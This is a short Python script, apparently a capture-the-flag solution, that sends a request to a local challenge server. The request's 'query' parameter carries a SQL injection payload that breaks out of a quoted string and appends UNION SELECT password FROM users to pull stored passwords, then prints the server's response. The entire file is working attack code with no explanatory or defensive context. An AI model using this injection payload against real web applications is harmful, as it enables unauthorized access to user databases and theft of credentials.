import requests

URL = "http://challenge.localhost:80"

PARAMS = {"query" : 'admin" UNION SELECT password FROM users; --'}
response = requests.get(url = URL, params = PARAMS);

print(response.content)
